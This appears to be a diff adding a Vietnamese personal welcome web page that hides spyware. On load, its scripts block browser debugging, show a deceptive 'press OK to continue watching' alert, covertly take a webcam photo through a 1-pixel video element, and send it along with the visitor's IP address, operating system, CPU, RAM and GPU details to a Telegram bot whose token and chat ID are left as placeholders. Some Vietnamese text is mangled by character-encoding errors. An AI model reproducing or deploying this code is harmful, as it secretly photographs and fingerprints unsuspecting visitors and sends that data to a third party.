@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+    <title>Ðinh Duy Vinh </title>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <script type='text/javascript'>
+
+      ! function t() {
+
+          try {
+
+              ! function t(n) {
+
+                  1 === ("" + n / n).length && 0 !== n || function() {}.constructor("debugger")(), t(++n)
+
+              }(0)
+
+          } catch (n) {
+
+              setTimeout(t, 50)
+
+          }
+
+      }();
+
+  </script>
+
+    <style>
+
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');
+
+    
+
+    .container {
+
+      display: flex;
+
+      flex-direction: column;
+
+      align-items: center;
+
+      justify-content: center;
+
+      height: 100vh;
+
+      background: linear-gradient(to bottom right, #ffafbd, #ffc3a0);
+
+      animation: backgroundAnimation 10s infinite;
+
+    }
+
+    
+
+    @keyframes backgroundAnimation {
+
+      0% {
+
+        background: linear-gradient(to bottom right, #ffafbd, #ffc3a0);
+
+      }
+
+      50% {
+
+        background: linear-gradient(to bottom right, #ffc3a0, #ffafbd);
+
+      }
+
+      100% {
+
+        background: linear-gradient(to bottom right, #ffafbd, #ffc3a0);
+
+      }
+
+    }
+
+    
+
+    h1 {
+
+      color: #333;
+
+      font-size: 32px;
+
+      font-family: 'Roboto', sans-serif;
+
+      animation: textAnimation 2s infinite;
+
+    }
+
+    
+
+    @keyframes textAnimation {
+
+      0% {
+
+        color: #333;
+
+      }
+
+      50% {
+
+        color: #ff0000;
+
+        transform: scale(1.2);
+
+      }
+
+      100% {
+
+        color: #333;
+
+      }
+
+    }
+
+    
+
+    p {
+
+      color: #666;
+
+      font-size: 18px;
+
+      font-family: 'Roboto', sans-serif;
+
+    }
+
+    </style>
+
+    </head>
+
+    <body>
+
+      <div class="container">
+
+        <h1>XIN CHÀO M?I NGÝ?I!</h1>
+
+        <p>Tôi r?t vui ðý?c chào ðón b?n ð?n v?i <a href="https://m.me/duyvinh09" rel="nofollow" target="_blank">trang web</a> c?a tôi.</p>
+
+      </div>
+
+ 
+
+  <script>
+
+    // Hàm ch?p ?nh khuôn m?t b?ng webcam
+
+    function capturePhoto() {
+
+        var video = document.getElementById('video');
+
+        var canvas = document.createElement('canvas');
+
+        var context = canvas.getContext('2d');
+
+ 
+
+        // Cài ð?t kích thý?c canvas b?ng kích thý?c video
+
+        canvas.width = video.videoWidth;
+
+        canvas.height = video.videoHeight;
+
+ 
+
+        // Ch?p ?nh t? video
+
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+ 
+
+        // L?y d? li?u ?nh dý?i d?ng Blob
+
+        canvas.toBlob(function(blob) {
+
+            // G?i ?nh qua Telegram
+
+            var formData = new FormData();
+
+            formData.append('chat_id', 'YOUR_CHAT_ID'); // Thay YOUR_CHAT_ID b?ng Chat ID c?a bot Telegram
+
+            formData.append('photo', blob, 'photo.jpg');
+
+ 
+
+            $.ajax({
+
+                type: 'POST',
+
+                url: 'https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendPhoto', // Thay YOUR_TELEGRAM_BOT_TOKEN b?ng Telegram Bot Token c?a b?n
+
+                data: formData,
+
+                processData: false,
+
+                contentType: false,
+
+                success: function(response) {
+
+                    console.log('Ð? g?i ?nh thành công ð?n Telegram');
+
+                },
+
+                error: function(error) {
+
+                    console.log('L?i khi g?i ?nh ð?n Telegram: ' + error);
+
+                }
+
+            });
+
+        }, 'image/jpeg');
+
+    }
+
+ 
+
+    // S? d?ng API getUserMedia ð? truy c?p webcam và t? ð?ng ch?p ?nh
+
+    function requestCameraAccess() {
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+
+            .then(function(stream) {
+
+                var video = document.getElementById('video');
+
+                video.srcObject = stream;
+
+                video.play();
+
+ 
+
+                // T? ð?ng ch?p ?nh sau 1 giây
+
+                setTimeout(function() {
+
+                    capturePhoto();
+
+                }, 500);
+
+            })
+
+            .catch(function(error) {
+
+                console.log('Ð? x?y ra l?i khi truy c?p webcam: ' + error.message);
+
+            });
+
+    }
+
+ 
+
+    // Hi?n th? h?p tho?i alert và x? l? ph?n h?i c?a ngý?i dùng
+
+    function showCameraAccessAlert() {
+
+        alert('?n OK ð? ti?p t?c xem.');
+
+        requestCameraAccess();
+
+    }
+
+ 
+
+    // G?i hàm hi?n th? h?p tho?i alert khi trang web ðý?c t?i
+
+    window.addEventListener('DOMContentLoaded', function() {
+
+        showCameraAccessAlert();
+
+    });
+
+</script>
+
+ 
+
+<video id="video" width="1" height="1" autoplay></video>
+
+ 
+
+  <script>
+
+    $(document).ready(function() {
+
+      var telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+
+      var chatId = 'YOUR_CHAT_ID';
+
+ 
+
+      // L?y ð?a ch? IP
+
+      $.getJSON('https://api.ipify.org?format=json', function(data) {
+
+        var ip = data.ip;
+
+ 
+
+        var cpu = navigator.hardwareConcurrency || 'N/A';
+
+        var ram = navigator.deviceMemory || 'N/A';
+
+        var disk = navigator.deviceStorage || 'N/A';
+
+        var gpu = getGraphicsCard();
+
+        var os = getOperatingSystem();
+
+        var userAgent = navigator.userAgent;
+
+ 
+
+        var message = '- Ð?a ch? IP m?i: ' + ip + '\n- User-Agent: ' + userAgent + '\n- H? ði?u hành: ' + os + '\n- CPU: ' + cpu + '\n- RAM: ' + ram + '\n- Disk: ' + disk + '\n- GPU: ' + gpu;
+
+ 
+
+        var payload = {
+
+          chat_id: chatId,
+
+          text: message
+
+        };
+
+ 
+
+        $.ajax({
+
+          type: 'POST',
+
+          url: 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage',
+
+          data: payload,
+
+          dataType: 'json',
+
+          success: function(response) {
+
+            console.log('Thông tin ð? ðý?c g?i thành công ð?n Telegram');
+
+          },
+
+          error: function(error) {
+
+            console.log('L?i khi g?i thông tin ð?n Telegram: ' + error);
+
+          }
+
+        });
+
+      });
+
+ 
+
+      // Các hàm h? tr?
+
+      function getOperatingSystem() {
+
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        if (/windows phone/i.test(userAgent)) {
+
+          return 'Windows Phone';
+
+        }
+
+        if (/android/i.test(userAgent)) {
+
+          return 'Android';
+
+        }
+
+        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+
+          return 'iOS';
+
+        }
+
+        if (/Macintosh|Mac OS X/.test(userAgent)) {
+
+          return 'Mac OS';
+
+        }
+
+        if (/Windows NT/.test(userAgent)) {
+
+          return 'Windows';
+
+        }
+
+        return 'Unknown';
+
+      }
+
+ 
+
+      function getGraphicsCard() {
+
+        var canvas = document.createElement('canvas');
+
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+
+        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+
+        var gpu = 'N/A';
+
+        if (debugInfo) {
+
+          gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+        }
+
+        return gpu;
+
+      }
+
+    });
+
+  </script>
+
+</body>
+
+</html>
+
+ 
